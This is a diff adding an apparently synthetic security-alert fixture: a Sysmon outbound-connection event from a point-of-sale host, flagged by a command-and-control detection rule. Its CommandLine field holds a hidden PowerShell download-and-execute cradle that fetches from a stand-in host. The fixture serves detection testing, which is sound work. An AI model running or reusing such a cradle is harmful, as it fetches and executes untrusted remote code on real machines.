@@ -1,0 +1,25 @@
+{
+  "timestamp": "2026-09-17T06:00:00.000Z",
+  "rule": {
+    "id": 100800,
+    "level": 12,
+    "description": "Suspicious outbound connection to unseen CTI infrastructure",
+    "mitre": {"id": ["T1071.001"], "tactic": ["Command and Control"], "technique": ["Application Layer Protocol"]}
+  },
+  "agent": {"id": "010", "name": "pos-unseen-01", "ip": "10.80.3.14"},
+  "decoder": {"name": "windows_eventchannel"},
+  "data": {
+    "win": {
+      "system": {"eventID": "3", "channel": "Microsoft-Windows-Sysmon/Operational"},
+      "eventdata": {
+        "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://relay-unseen.example/update')",
+        "DestinationIp": "203.0.113.42",
+        "DestinationPort": "443",
+        "Hashes": "SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "User": "POS\\\\cashier07"
+      }
+    }
+  },
+  "full_log": "Sysmon Event 3 dest=203.0.113.42 hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+}
